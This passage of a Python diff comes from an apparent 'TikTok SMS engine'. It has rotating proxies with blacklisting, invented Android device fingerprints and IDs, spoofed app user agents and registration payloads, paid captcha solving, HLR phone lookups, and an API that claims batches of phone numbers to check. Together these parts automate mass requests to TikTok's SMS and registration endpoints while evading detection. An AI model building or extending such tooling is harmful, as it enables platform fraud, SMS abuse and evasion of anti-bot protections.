+                        self.fail_count
+                        - MAX_PROXY_CONSECUTIVE_FAILS
+                    )),
+                    PROXY_BLACKLIST_CAP_SECONDS)
+                self.blacklisted_until = (
+                    time.time() + duration)
+                log.warning(
+                    'Proxy %s:%s blacklisted %ds',
+                    self.host, self.port,
+                    duration)
+
+    def __init__(self,
+                 proxies: Optional[List[str]]
+                 = None):
+        self._entries: List[
+            ProxyManager._Entry] = []
+        self._lock = asyncio.Lock()
+        self._index = 0
+        if proxies:
+            for proxy_str in proxies:
+                entry = self._parse(proxy_str)
+                if entry:
+                    self._entries.append(entry)
+            log.info(
+                'Proxy pool: %d loaded',
+                len(self._entries))
+
+    @staticmethod
+    def _parse(
+            proxy: str
+    ) -> Optional['ProxyManager._Entry']:
+        clean = proxy.strip()
+        for pfx in (
+                'http://', 'https://',
+                'socks5://'):
+            if clean.startswith(pfx):
+                clean = clean[len(pfx):]
+        host = port = user = password = ''
+
+        if '@' in clean:
+            auth, server = clean.rsplit('@', 1)
+            sp = server.split(':')
+            if len(sp) != 2:
+                return None
+            host, port = sp
+            ap = auth.split(':', 1)
+            user = ap[0]
+            password = ap[1] if len(ap) > 1 else ''
+        else:
+            parts = clean.split(':', 3)
+            if len(parts) == 2:
+                host, port = parts
+            elif len(parts) >= 4:
+                host = parts[0]
+                port = parts[1]
+                user = parts[2]
+                password = parts[3]
+            else:
+                return None
+
+        if not host or not port:
+            return None
+
+        return ProxyManager._Entry(
+            host=host, port=port,
+            user=user, password=password)
+
+    async def get(
+            self,
+            country_code: Optional[str] = None
+    ) -> Optional[str]:
+        if not self._entries:
+            return None
+        wait = 0.0
+        async with self._lock:
+            for _ in range(len(self._entries)):
+                entry = self._entries[
+                    self._index
+                    % len(self._entries)]
+                self._index += 1
+                if entry.is_available():
+                    return self._build_url(
+                        entry, country_code)
+            best = min(
+                self._entries,
+                key=lambda e:
+                e.blacklisted_until)
+            wait = max(
+                0.0,
+                best.blacklisted_until
+                - time.time())
+            if wait > 0:
+                log.warning(
+                    'All proxies blacklisted,'
+                    ' waiting %.1fs', wait)
+        if wait > 0:
+            await asyncio.sleep(
+                min(wait, 10.0))
+        async with self._lock:
+            best = min(
+                self._entries,
+                key=lambda e:
+                e.blacklisted_until)
+            best.blacklisted_until = 0
+            best.fail_count = 0
+            return self._build_url(
+                best, country_code)
+
+    @staticmethod
+    def _build_url(
+            entry: '_Entry',
+            country_code: Optional[str]
+    ) -> str:
+        password = entry.password
+        if country_code:
+            if 'COUNTRY_CODE' in password:
+                password = password.replace(
+                    'COUNTRY_CODE', country_code)
+            elif 'country-' not in password:
+                password = (
+                    password
+                    + '_country-'
+                    + country_code
+                    + '_streaming-1')
+        if entry.user:
+            encoded_user = quote(
+                entry.user, safe='')
+            encoded_pass = quote(
+                password, safe='')
+            return (
+                'http://'
+                + encoded_user + ':'
+                + encoded_pass
+                + '@' + entry.host
+                + ':' + entry.port)
+        return (
+            'http://' + entry.host
+            + ':' + entry.port)
+
+    async def report_success(
+            self,
+            proxy_url: Optional[str]) -> None:
+        if not proxy_url or not self._entries:
+            return
+        async with self._lock:
+            for entry in self._entries:
+                if entry.host in proxy_url:
+                    entry.record_success()
+                    return
+
+    async def report_failure(
+            self,
+            proxy_url: Optional[str]) -> None:
+        if not proxy_url or not self._entries:
+            return
+        async with self._lock:
+            for entry in self._entries:
+                if entry.host in proxy_url:
+                    entry.record_failure()
+                    return
+
+
+# ============================================
+#  CONFIG
+# ============================================
+
+@dataclass
+class AppConfig:
+    sadcaptcha_key: str = ''
+    hlr_api_key: str = ''
+    hlr_api_url: str = (
+        'https://hlrdeep.com/api/public'
+        '/v1/hlr/check')
+    number_api_base: str = ''
+    number_api_key: str = ''
+    claim_count: int = 10
+    lease_seconds: int = 600
+    max_retries: int = 3
+    request_timeout: int = 15
+    delay_min: float = 0.5
+    delay_max: float = 2.0
+    device_pool_path: str = 'device_pool.json'
+    device_pool_size: int = 50
+    global_rps: float = 10.0
+    global_burst: int = 20
+    default_version: str = '43.9.2'
+    ms_token_max_uses: int = MS_TOKEN_MAX_USES
+    device_max_uses: int = (
+        DEVICE_MAX_USES_PER_SESSION)
+    recovery_max_uses: int = (
+        RECOVERY_MAX_USES_PER_SESSION)
+    debug_registration: bool = False
+    include_deprecated_endpoints: bool = False
+    endpoint_fallback_delay: float = 1.5
+
+    devices: Tuple[
+        Tuple[str, str, str, str, str, str],
+        ...] = (
+        ('Google', 'Pixel 9', '35', '15',
+         '420', '1080*2424'),
+        ('Google', 'Pixel 9 Pro', '35', '15',
+         '512', '1280*2856'),
+        ('Google', 'Pixel 9 Pro XL', '35', '15',
+         '512', '1344*2992'),
+        ('Samsung', 'SM-S928B', '35', '15',
+         '480', '1440*3120'),
+        ('Samsung', 'SM-S926B', '35', '15',
+         '480', '1440*3120'),
+        ('Google', 'Pixel 8', '34', '14',
+         '420', '1080*2400'),
+        ('Google', 'Pixel 8 Pro', '34', '14',
+         '512', '1344*2992'),
+        ('Google', 'Pixel 7 Pro', '34', '14',
+         '512', '1440*3120'),
+        ('Samsung', 'SM-S918B', '34', '14',
+         '480', '1440*3088'),
+        ('Samsung', 'SM-A546B', '34', '14',
+         '400', '1080*2340'),
+        ('Xiaomi', '2304FPN6DC', '34', '14',
+         '440', '1080*2400'),
+        ('OnePlus', 'CPH2449', '34', '14',
+         '480', '1240*2772'),
+        ('Google', 'Pixel 7', '33', '13',
+         '420', '1080*2400'),
+        ('Samsung', 'SM-G998B', '33', '13',
+         '480', '1440*3200'),
+        ('Xiaomi', 'MI 13', '33', '13',
+         '440', '1080*2400'),
+        ('OnePlus', 'NE2215', '33', '13',
+         '420', '1080*2400'),
+    )
+
+    mcc_mnc: Tuple[
+        Tuple[str, Tuple[str, ...]], ...] = (
+        ('US', ('310260', '310410', '311480')),
+        ('GB', ('23410', '23415', '23420')),
+        ('DE', ('26201', '26202', '26203')),
+        ('FR', ('20801', '20810', '20820')),
+        ('RU', ('25001', '25002', '25099')),
+        ('UA', ('25501', '25503', '25506')),
+        ('IN', ('40401', '40410', '40445')),
+        ('BR', ('72405', '72410', '72411')),
+        ('AT', ('23201', '23203', '23205')),
+        ('VN', ('45201', '45202', '45204')),
+        ('TR', ('28601', '28602', '28603')),
+        ('PL', ('26001', '26002', '26003')),
+        ('IT', ('22201', '22210', '22288')),
+        ('ES', ('21401', '21403', '21407')),
+        ('NL', ('20404', '20408', '20412')),
+        ('BE', ('20601', '20605', '20610')),
+    )
+
+    api_hosts: Tuple[str, ...] = (
+        'api16-normal-c-useast1a.tiktokv.com',
+        'api22-normal-c-useast1a.tiktokv.com',
+        'api19-normal-c-useast1a.tiktokv.com',
+        'api16-normal-c-useast2a.tiktokv.com',
+    )
+
+    def __hash__(self):
+        return hash(self.default_version)
+
+    def __eq__(self, other):
+        if not isinstance(other, AppConfig):
+            return NotImplemented
+        return (self.default_version
+                == other.default_version)
+
+    def _validate_apk(self) -> None:
+        if (self.default_version
+                not in _APK_VERSION_MAP):
+            raise ConfigError(
+                'Unknown version: '
+                + self.default_version)
+        apk = self.get_default_apk_version()
+        compatible = [
+            d for d in self.devices
+            if apk.is_device_compatible(
+                int(d[2]))]
+        if not compatible:
+            raise ConfigError(
+                'No devices for '
+                + apk.version_name)
+
+    def validate(self, mode: str = 'csv') -> None:
+        missing = []
+        if mode in ('csv', 'api'):
+            if not self.sadcaptcha_key:
+                missing.append('sadcaptcha_key')
+            if not self.hlr_api_key:
+                missing.append('hlr_api_key')
+        if mode == 'api':
+            if not self.number_api_base:
+                missing.append('number_api_base')
+            if not self.number_api_key:
+                missing.append('number_api_key')
+        if mode == 'prewarm':
+            if not self.sadcaptcha_key:
+                missing.append('sadcaptcha_key')
+        if missing:
+            raise ConfigError(
+                'Missing: ' + ', '.join(missing))
+        self._validate_apk()
+
+    def validate_recovery(
+            self,
+            need_number_api: bool = False
+    ) -> None:
+        missing = []
+        if not self.hlr_api_key:
+            missing.append('hlr_api_key')
+        if need_number_api:
+            if not self.number_api_base:
+                missing.append(
+                    'number_api_base')
+            if not self.number_api_key:
+                missing.append(
+                    'number_api_key')
+        if missing:
+            raise ConfigError(
+                'Missing: ' + ', '.join(missing))
+        self._validate_apk()
+        if not self.sadcaptcha_key:
+            log.warning(
+                'No sadcaptcha_key.'
+                ' Captcha handled by rotation.')
+
+    def get_mcc_mnc(
+            self, region: str
+    ) -> Tuple[str, ...]:
+        for code, mncs in self.mcc_mnc:
+            if code == region:
+                return mncs
+        return ('310260',)
+
+    def random_device_hw(
+            self,
+            apk_ver: Optional[
+                APKVersion] = None
+    ) -> Tuple[str, ...]:
+        if apk_ver is not None:
+            compatible = [
+                d for d in self.devices
+                if apk_ver.is_device_compatible(
+                    int(d[2]))]
+            if compatible:
+                return random.choice(compatible)
+            log.error(
+                'No devices for %s',
+                apk_ver.version_name)
+        return random.choice(self.devices)
+
+    def get_default_apk_version(
+            self) -> APKVersion:
+        return get_apk_version(
+            self.default_version)
+
+    def random_host(self) -> str:
+        return random.choice(self.api_hosts)
+
+    def with_overrides(
+            self, **kwargs) -> 'AppConfig':
+        return replace(self, **kwargs)
+
+
+def load_config(
+        path: str = 'config.json') -> AppConfig:
+    overrides: Dict[str, Any] = {}
+    valid_keys = {
+        f.name for f in fields(AppConfig)
+        if f.name not in (
+            'devices', 'mcc_mnc', 'api_hosts')}
+    if os.path.exists(path):
+        try:
+            with open(path, 'r') as f:
+                raw = json.load(f)
+            for key, val in raw.items():
+                if key in valid_keys:
+                    overrides[key] = val
+            log.info('Config: %s', path)
+        except (json.JSONDecodeError,
+                IOError) as exc:
+            log.warning(
+                'Config error (%s): %s',
+                path, exc)
+    env_map = {
+        'SADCAPTCHA_KEY': 'sadcaptcha_key',
+        'HLR_API_KEY': 'hlr_api_key',
+        'HLR_API_URL': 'hlr_api_url',
+        'NUMBER_API_BASE': 'number_api_base',
+        'NUMBER_API_KEY': 'number_api_key',
+        'DEVICE_POOL_PATH': 'device_pool_path',
+    }
+    for env_key, conf_key in env_map.items():
+        val = os.environ.get(env_key)
+        if val:
+            overrides[conf_key] = val
+    return AppConfig(**overrides)
+
+
+# ============================================
+#  NUMBER API
+# ============================================
+
+class NumberAPI:
+
+    def __init__(self, config: AppConfig):
+        self.base_url = (
+            config.number_api_base.rstrip('/'))
+        self._headers = {
+            'X-API-Key': config.number_api_key,
+            'Content-Type': 'application/json',
+        }
+
+    async def _post(
+            self,
+            session: aiohttp.ClientSession,
+            endpoint: str,
+            payload: dict) -> Optional[dict]:
+        url = self.base_url + endpoint
+        for attempt in range(3):
+            check_shutdown()
+            try:
+                async with session.post(
+                    url, headers=self._headers,
+                    json=payload,
+                    timeout=aiohttp.ClientTimeout(
+                        total=15)
+                ) as resp:
+                    if resp.status == 200:
+                        return await resp.json()
+                    if resp.status in (
+                            400, 401, 409):
+                        text = await resp.text()
+                        log.error(
+                            'NumberAPI %d: %s',
+                            resp.status,
+                            text[:200])
+                        return None
+                    if resp.status in (
+                            RETRYABLE_HTTP_CODES):
+                        await asyncio.sleep(
+                            jitter_delay(attempt))
+                        continue
+                    text = await resp.text()
+                    log.error(
+                        'NumberAPI %d: %s',
+                        resp.status,
+                        text[:200])
+                    return None
+            except (
+                asyncio.TimeoutError,
+                aiohttp.ServerTimeoutError
+            ):
+                await asyncio.sleep(
+                    jitter_delay(attempt, 0.5))
+            except aiohttp.ClientError as exc:
+                raise NetworkError(
+                    'NumberAPI: ' + str(exc))
+            except ShutdownError:
+                raise
+            except Exception as exc:
+                raise NetworkError(
+                    'NumberAPI: ' + str(exc))
+        return None
+
+    async def claim(
+            self,
+            session: aiohttp.ClientSession,
+            count: int = 10,
+            lease_seconds: int = 600
+    ) -> Optional[dict]:
+        data = await self._post(
+            session, '/v1/numbers/claim', {
+                'count': max(
+                    1, min(count, 500)),
+                'leaseSeconds': max(
+                    30, min(
+                        lease_seconds, 86400)),
+            })
+        if data:
+            items = data.get('items', [])
+            claim_id = data.get('claimId', '?')
+            log.info(
+                'Claimed %d (claim=%s)',
+                len(items), claim_id)
+        return data
+
+    async def report(
+            self,
+            session: aiohttp.ClientSession,
+            claim_id: str,
+            results: List[dict]
+    ) -> Optional[dict]:
+        if not results:
+            return {'updated': 0, 'ignored': 0}
+        data = await self._post(
+            session, '/v1/numbers/report', {
+                'claimId': claim_id,
+                'results': results[:500],
+            })
+        if data:
+            log.info(
+                'Report: updated=%d',
+                data.get('updated', 0))
+        return data
+
+
+# ============================================
+#  HLR
+# ============================================
+
+class HLRLookup:
+
+    def __init__(self, config: AppConfig):
+        self.api_key = config.hlr_api_key
+        self.api_url = config.hlr_api_url
+
+    async def lookup(
+            self,
+            session: aiohttp.ClientSession,
+            phone: str) -> Optional[HLRResult]:
+        masked = mask_phone(phone)
+        phone_clean = strip_plus(phone)
+        for attempt in range(3):
+            check_shutdown()
+            try:
+                async with session.get(
+                    self.api_url,
+                    params={
+                        'phoneNumber':
+                            phone_clean},
+                    headers={
+                        'X-API-Key':
+                            self.api_key},
+                    timeout=(
+                        aiohttp.ClientTimeout(
+                            total=10))
+                ) as resp:
+                    if resp.status == 200:
+                        data = await resp.json()
+                        if data.get('success'):
+                            info = (
+                                data.get('data')
+                                or {})
+                            return (
+                                HLRResult.from_api(
+                                    info,
+                                    phone_clean))
+                        return None
+                    if resp.status in (
+                            RETRYABLE_HTTP_CODES):
+                        await asyncio.sleep(
+                            jitter_delay(attempt))
+                        continue
+                    return None
+            except (
+                asyncio.TimeoutError,
+                aiohttp.ServerTimeoutError
+            ):
+                await asyncio.sleep(
+                    jitter_delay(attempt, 0.5))
+            except aiohttp.ClientError as exc:
+                raise NetworkError(
+                    'HLR ' + masked
+                    + ': ' + str(exc))
+            except ShutdownError:
+                raise
+            except Exception as exc:
+                raise NetworkError(
+                    'HLR ' + masked
+                    + ': ' + str(exc))
+        return None
+
+
+# ============================================
+#  DEVICE
+# ============================================
+
+@dataclass
+class Device:
+
+    device_id: str = ''
+    install_id: str = ''
+    openudid: str = ''
+    cdid: str = ''
+    device_type: str = ''
+    device_brand: str = ''
+    os_version: str = ''
+    os_api: str = ''
+    dpi: str = ''
+    resolution: str = ''
+    version_name: str = ''
+    version_code: str = ''
+    manifest_version_code: str = ''
+    region: str = 'US'
+    mcc_mnc: str = ''
+    registered: bool = False
+    ms_token: str = ''
+    ms_token_time: float = 0.0
+    ms_token_uses: int = 0
+    last_used: float = 0.0
+    use_count: int = 0
+    session_uses: int = 0
+
+    @classmethod
+    def generate(
+            cls, config: AppConfig,
+            region: str = 'US') -> 'Device':
+        ver = config.get_default_apk_version()
+        hw = config.random_device_hw(
+            apk_ver=ver)
+        brand, model, os_api = hw[0], hw[1], hw[2]
+        os_ver, dpi, res = hw[3], hw[4], hw[5]
+        rand_hex = '%08x-%04x-%04x-%04x-%012x' % (
+            random.randint(10000000, 99999999),
+            random.randint(1000, 9999),
+            random.randint(1000, 9999),
+            random.randint(1000, 9999),
+            random.randint(
+                100000000000, 999999999999))
+        return cls(
+            device_id=str(random.randint(
+                DEVICE_ID_MIN, DEVICE_ID_MAX)),
+            install_id=str(random.randint(
+                DEVICE_ID_MIN, DEVICE_ID_MAX)),
+            openudid=hashlib.md5(
+                (str(random.random())
+                 + str(time.time())
+                 ).encode()).hexdigest()[:16],
+            cdid=rand_hex,
+            device_type=model,
+            device_brand=brand,
+            os_version=os_ver, os_api=os_api,
+            dpi=dpi, resolution=res,
+            version_name=ver.version_name,
+            version_code=ver.version_code,
+            manifest_version_code=(
+                ver.manifest_version_code),
+            region=region,
+            mcc_mnc=random.choice(
+                config.get_mcc_mnc(region)),
+        )
+
+    @classmethod
+    def generate_lightweight(
+            cls, config: AppConfig,
+            region: str = 'US') -> 'Device':
+        device = cls.generate(config, region)
+        device.registered = False
+        return device
+
+    def to_dict(self) -> dict:
+        return {
+            f.name: getattr(self, f.name)
+            for f in fields(self)}
+
+    @classmethod
+    def from_dict(
+            cls, data: dict) -> 'Device':
+        valid_names = {
+            f.name for f in fields(cls)}
+        return cls(**{
+            k: v for k, v in data.items()
+            if k in valid_names})
+
+    @property
+    def apk_version(self) -> APKVersion:
+        return get_apk_version(
+            self.version_name)
+
+    @property
+    def ms_token_valid(self) -> bool:
+        if not self.ms_token:
+            return False
+        age_ok = (
+            (time.time() - self.ms_token_time)
+            < MS_TOKEN_TTL_SECONDS)
+        uses_ok = (
+            self.ms_token_uses
+            < MS_TOKEN_MAX_USES)
+        return age_ok and uses_ok
+
+    def invalidate_ms_token(self) -> None:
+        self.ms_token = ''
+        self.ms_token_time = 0.0
+        self.ms_token_uses = 0
+
+    def set_ms_token(self, token: str) -> None:
+        self.ms_token = token
+        self.ms_token_time = time.time()
+        self.ms_token_uses = 0
+
+    def record_ms_token_use(self) -> None:
+        self.ms_token_uses += 1
+
+    def record_session_use(self) -> None:
+        self.session_uses += 1
+
+    def needs_rotation(
+            self, max_uses: int) -> bool:
+        return self.session_uses >= max_uses
+
+    @property
+    def manifest_int(self) -> int:
+        return self.apk_version.manifest_int
+
+    @property
+    def user_agent(self) -> str:
+        ver = self.apk_version
+        return (
+            'com.zhiliaoapp.musically/'
+            + ver.manifest_version_code
+            + ' (Linux; U; Android '
+            + self.os_version + '; en; '
+            + self.device_type
+            + '; Build/' + DEVICE_ROM_BUILD
+            + ';tt-ok/' + ver.tt_ok_version
+            + ')')
+
+    def base_params(self) -> Dict[str, str]:
+        ver = self.apk_version
+        now_ms = str(int(time.time() * 1000))
+        now_s = str(int(time.time()))
+        params: Dict[str, str] = {
+            'passport-sdk-version':
+                ver.passport_sdk_version,
+            'iid': self.install_id,
+            'device_id': self.device_id,
+            'ac': 'wifi',
+            'channel': APP_CHANNEL,
+            'aid': APP_AID,
+            'app_name': 'musical_ly',
+            'version_code': self.version_code,
+            'version_name': self.version_name,
+            'device_platform': 'android',
+            'os': 'android',
+            'ab_version': self.version_name,
+            'ssmix': 'a',
+            'device_type': self.device_type,
+            'device_brand': self.device_brand,
+            'language': 'en',
+            'os_api': self.os_api,
+            'os_version': self.os_version,
+            'openudid': self.openudid,
+            'manifest_version_code':
+                self.manifest_version_code,
+            'resolution': self.resolution,
+            'dpi': self.dpi,
+            'update_version_code':
+                self.manifest_version_code,
+            '_rticket': now_ms,
+            'is_pad': '0',
+            'current_region': self.region,
+            'app_type': 'normal',
+            'sys_region': self.region,
+            'mcc_mnc': self.mcc_mnc,
+            'timezone_name':
+                'America/New_York',
+            'residence': self.region,
+            'app_language': 'en',
+            'carrier_region': self.region,
+            'ac2': 'wifi',
+            'uoo': '0',
+            'op_region': self.region,
+            'timezone_offset': '-14400',
+            'build_number': self.version_name,
+            'host_abi': DEVICE_CPU_ABI,
+            'locale': 'en',
+            'region': self.region,
+            'ts': now_s,
+            'cdid': self.cdid,
+        }
+        if self.ms_token_valid:
+            params['msToken'] = self.ms_token
+        return params
+
+    def base_params_with_signerpy_update(
+            self) -> Dict[str, str]:
+        """Get base params and update them using
+        SignerPy.get() for fingerprint enrichment.
+        """
+        params = self.base_params()
+        try:
+            updates = signer_get_params(params)
+            if updates:
+                params.update(updates)
+        except SignerError as exc:
+            log.debug(
+                'SignerPy.get() failed: %s,'
+                ' using base params', exc)
+        return params
+
+    def registration_payload(self) -> dict:
+        ver = self.apk_version
+        return {
+            'magic_tag': 'ss_app_log',
+            'header': {
+                'display_name':
+                    APP_DISPLAY_NAME,
+                'update_version_code':
+                    ver.manifest_int,
+                'manifest_version_code':
+                    ver.manifest_int,
+                'aid': int(APP_AID),
+                'channel': APP_CHANNEL,
+                'package': APP_PACKAGE,
+                'app_version':
+                    ver.version_name,
+                'version_code':
+                    ver.version_code_int,
+                'sdk_version':
+                    APP_SDK_VERSION,
+                'os': 'Android',
+                'os_version': self.os_version,
+                'os_api': self.os_api,
+                'device_model':
+                    self.device_type,
+                'device_brand':
+                    self.device_brand,
+                'device_manufacturer':
+                    self.device_brand,
+                'cpu_abi': DEVICE_CPU_ABI,
+                'release_build': '1',
+                'density_dpi': int(self.dpi),
+                'display_density': 'xhdpi',
+                'resolution': self.resolution,
+                'language': 'en',
+                'timezone': -5,
+                'access': 'wifi',
+                'not_request_sender': 0,
+                'rom': DEVICE_ROM_BUILD,
+                'rom_version':
+                    self.os_version,
+                'openudid': self.openudid,
+                'cdid': self.cdid,
+                'sig_hash': ver.sig_hash,
+                'region': self.region,
+                'app_language': 'en',
+                'locale': 'en',
+                'sys_region': self.region,
+                'carrier_region': self.region,
+                'mcc_mnc': self.mcc_mnc,
+            },
+            '_gen_time': int(time.time()),
+        }
+
+    def validate_pool_entry(self) -> List[str]:
+        issues: List[str] = []
+        ver = self.apk_version
+        for fname in (
+                'device_id', 'install_id',
+                'openudid', 'cdid',
+                'device_type', 'device_brand',
+                'os_version', 'os_api',
+                'dpi', 'resolution',
+                'version_name'):
+            if not getattr(self, fname, ''):
+                issues.append(
+                    fname + ' is empty')
+        try:
+            int(self.dpi)
+        except (ValueError, TypeError):
+            issues.append(
+                'dpi "' + self.dpi
+                + '" not numeric')
+        try:
+            hw_api = int(self.os_api)
+            if not ver.is_device_compatible(
+                    hw_api):
+                issues.append(
+                    'os_api ' + str(hw_api)
+                    + ' outside ['
+                    + str(ver.min_sdk) + '-'
+                    + str(ver.target_sdk) + ']')
+        except (ValueError, TypeError):
+            issues.append(
+                'os_api "' + self.os_api
+                + '" not numeric')
+        if (self.version_name
+                != ver.version_name):
+            issues.append(
+                'version mismatch: '
+                + self.version_name
+                + ' vs ' + ver.version_name)
+        if ver.stability == 'deprecated':
+            issues.append(
+                ver.version_name
+                + ' is deprecated')
+        return issues
+
+
+# ============================================
+#  DEVICE POOL
+# ============================================
+
+def _validate_device_dict(data: Any) -> bool:
+    if not isinstance(data, dict):
+        return False
+    if not DEVICE_POOL_REQUIRED_KEYS.issubset(
+            data.keys()):
+        return False
+    if not isinstance(
+            data.get('device_id'), str):
+        return False
+    if not isinstance(
+            data.get('registered'), bool):
+        return False
+    return True
+
+
+class DevicePool:
+
+    def __init__(self, config: AppConfig):
+        self.config = config
+        self.path = config.device_pool_path
+        self._pool: Dict[str, List[dict]] = {}
+        self._lock = asyncio.Lock()
+        self._dirty = False
+        self._load_sync()
+
+    def _load_sync(self) -> None:
+        if not os.path.exists(self.path):
+            log.info('No pool at %s', self.path)
+            return
+        try:
+            with open(self.path, 'r') as f:
+                raw = json.load(f)
+            if not isinstance(raw, dict):
+                log.warning(
+                    'Pool file root not dict')
+                return
+            total = 0
+            skipped = 0
+            for region, dl in raw.items():
+                if not isinstance(dl, list):
+                    continue
+                valid = [
+                    d for d in dl
+                    if _validate_device_dict(d)]
+                skipped += len(dl) - len(valid)
+                if valid:
+                    self._pool[region] = valid
+                    total += len(valid)
+            if skipped:
+                log.warning(
+                    'Pool: skipped %d invalid',
+                    skipped)
+            log.info(
+                'Pool: %d devices, %d regions',
+                total, len(self._pool))
+        except (json.JSONDecodeError,
+                IOError) as exc:
+            log.warning('Pool load: %s', exc)
+
+    def _save_sync(self) -> None:
+        try:
+            tmp = self.path + '.tmp'
+            with open(tmp, 'w') as f:
+                json.dump(
+                    self._pool, f, indent=2)
+                f.flush()
+                os.fsync(f.fileno())
+            if (sys.platform == 'win32'
+                    and os.path.exists(
+                        self.path)):
+                os.remove(self.path)
+            os.rename(tmp, self.path)
+            self._dirty = False
+        except IOError as exc:
+            log.error('Pool save: %s', exc)
+
+    async def save(
+            self, force: bool = False) -> None:
+        async with self._lock:
+            if self._dirty or force:
+                await run_in_io(self._save_sync)
+
+    async def get(
+            self,
+            region: str) -> Optional[Device]:
+        async with self._lock:
+            dd = self._pool.get(region, [])
+            registered = [
+                d for d in dd
+                if d.get('registered')]
+            if not registered:
+                return None
+            registered.sort(
+                key=lambda d:
+                d.get('last_used', 0))
+            chosen = registered[0]
+            chosen['last_used'] = time.time()
+            chosen['use_count'] = (
+                chosen.get('use_count', 0) + 1)
+            self._dirty = True
+            return Device.from_dict(
+                dict(chosen))
+
+    async def add(
+            self, device: Device) -> None:
+        async with self._lock:
+            dd = device.to_dict()
+            if not _validate_device_dict(dd):
+                log.warning(
+                    'Refusing invalid device')
+                return
+            region = device.region
+            if region not in self._pool:
+                self._pool[region] = []
+            self._pool[region].append(dd)
+            mx = self.config.device_pool_size
+            if len(self._pool[region]) > mx:
+                self._pool[region].sort(
+                    key=lambda d:
+                    d.get('use_count', 0))
+                self._pool[region] = (
+                    self._pool[region][:mx])
+            self._dirty = True
+
+    async def update(
+            self, device: Device) -> None:
+        async with self._lock:
+            region = device.region
+            if region not in self._pool:
+                return
+            new_data = device.to_dict()
+            if not _validate_device_dict(
+                    new_data):
+                return
+            tid = device.device_id
+            for idx, existing in enumerate(
+                    self._pool[region]):
+                if existing.get(
+                        'device_id') == tid:
+                    self._pool[region][idx] = (
+                        new_data)
+                    self._dirty = True
+                    return
+
+    async def remove(
+            self, device: Device) -> None:
+        async with self._lock:
+            region = device.region
+            if region in self._pool:
+                tid = device.device_id
+                self._pool[region] = [
+                    d for d
+                    in self._pool[region]
+                    if d.get(
+                        'device_id') != tid]
+                self._dirty = True
+
+    async def count(
+            self,
+            region: Optional[str] = None
+    ) -> int:
+        async with self._lock:
+            if region:
+                return len([
+                    d for d in self._pool.get(
+                        region, [])
+                    if d.get('registered')])
+            return sum(
+                len([d for d in devs
+                     if d.get('registered')])
+                for devs
+                in self._pool.values())
+
+
+# ============================================
+#  CAPTCHA
+# ============================================
+
+class CaptchaSolver:
+    BASE_URL = (
+        'https://www.sadcaptcha.com/api/v1')
+
+    def __init__(self, config: AppConfig):
+        self.api_key = config.sadcaptcha_key
+        self._balance: int = -1
+
+    @property
+    def has_key(self) -> bool:
+        return bool(self.api_key)
+
+    async def check_balance(
+            self,
+            session: aiohttp.ClientSession
+    ) -> int:
+        if not self.api_key:
+            log.info(
+                'No captcha key, skipping'
+                ' balance check')
+            return -1
+        try:
+            async with session.get(
+                self.BASE_URL
+                + '/license/credits',
+                params={
+                    'licenseKey': self.api_key},
+                timeout=aiohttp.ClientTimeout(
+                    total=10)
+            ) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    self._balance = data.get(
+                        'credits', 0)
+                    log.info(
+                        'Captcha balance: %d',
+                        self._balance)
+                    return self._balance
+                return -1
+        except Exception as exc:
+            log.warning(
+                'Captcha balance: %s', exc)
+            return -1
+
+    async def _call(
+            self,
+            session: aiohttp.ClientSession,
+            endpoint: str, payload: dict,
+            timeout: float,
+            phone: str = ''
+    ) -> Optional[dict]:
+        masked = mask_phone(phone)
+        for attempt in range(3):
+            try:
+                async with session.post(
+                    self.BASE_URL + endpoint,
+                    params={
+                        'licenseKey':
+                            self.api_key},
+                    json=payload,
+                    timeout=(
+                        aiohttp.ClientTimeout(
+                            total=timeout))
+                ) as resp:
+                    if resp.status == 200:
+                        result = (
+                            await resp.json())
+                        log.info(
+                            '[%s] Solved (%s)',
+                            masked, endpoint)
+                        return result
+                    if resp.status in (
+                            RETRYABLE_HTTP_CODES):
+                        await asyncio.sleep(
+                            jitter_delay(attempt))
+                        continue
+                    text = await resp.text()
+                    raise CaptchaError(
+                        str(resp.status) + ': '
+                        + text[:150])
+            except (
+                asyncio.TimeoutError,
+                aiohttp.ServerTimeoutError
+            ):
+                await asyncio.sleep(
+                    jitter_delay(attempt, 0.5))
+            except aiohttp.ClientError as exc:
+                raise NetworkError(
+                    'Captcha: ' + str(exc))
+            except (
+                ShutdownError, CaptchaError
+            ):
+                raise
+            except Exception as exc:
+                raise CaptchaError(
+                    type(exc).__name__ + ': '
+                    + str(exc))
+        raise CaptchaError('Max retries')
+
+    async def solve(
+            self, subtype: str,
+            session: aiohttp.ClientSession,
+            phone: str = '',
+            **kwargs) -> Optional[dict]:
+        if self._balance == 0:
+            raise CaptchaError('Balance 0')
+        if not self.api_key:
+            raise CaptchaError(
+                'No captcha key configured')
+        ep_map = {
+            '3d': '/shapes',
+            'shapes': '/shapes',
+            'slide': '/puzzle',
+            'puzzle': '/puzzle',
+            'rotate': '/rotate',
+            'icon': '/icon',
+        }
+        endpoint = ep_map.get(subtype)
+        if not endpoint:
+            raise CaptchaError(
+                'Unknown subtype: ' + subtype)
+        pl_map = {
+            '/shapes': {
+                'imageB64': kwargs.get(
+                    'image_b64', '')},
+            '/puzzle': {
+                'puzzleImageB64': kwargs.get(
+                    'puzzle_b64', ''),
+                'pieceImageB64': kwargs.get(
+                    'piece_b64', '')},
+            '/rotate': {
+                'outerImageB64': kwargs.get(
+                    'outer_b64', ''),
+                'innerImageB64': kwargs.get(
+                    'inner_b64', '')},
+            '/icon': {
+                'challenge': kwargs.get(
+                    'challenge', ''),
+                'imageB64': kwargs.get(
+                    'image_b64', '')},
+        }
+        timeout = CAPTCHA_TIMEOUTS.get(
+            subtype, CAPTCHA_TIMEOUT_DEFAULT)
+        return await self._call(
+            session, endpoint,
+            pl_map[endpoint],
+            timeout, phone)
+
+
+# ============================================
+#  TIKTOK SMS ENGINE
+# ============================================
+
+class TikTokSMS:
+
+    def __init__(
+            self, config: AppConfig,
+            connector: aiohttp.TCPConnector,
+            proxy_mgr: ProxyManager,
+            captcha: CaptchaSolver,
+            hlr: HLRLookup,
+            pool: DevicePool,
+            limiter: RateLimiter):
+        self.config = config
+        self._connector = connector
+        self.proxy = proxy_mgr
+        self.captcha = captcha
+        self.hlr = hlr
+        self.pool = pool
+        self.limiter = limiter
+        self.api_host = config.random_host()
+        self.device: Optional[Device] = None
+        self._cookie_jar = aiohttp.CookieJar(
+            unsafe=True)
+        self._session: Optional[
+            aiohttp.ClientSession] = None
+
+    async def __aenter__(self) -> 'TikTokSMS':
+        return self
+
+    async def __aexit__(self, *exc) -> None:
+        await self.close()
+
+    async def _get_session(
+            self) -> aiohttp.ClientSession:
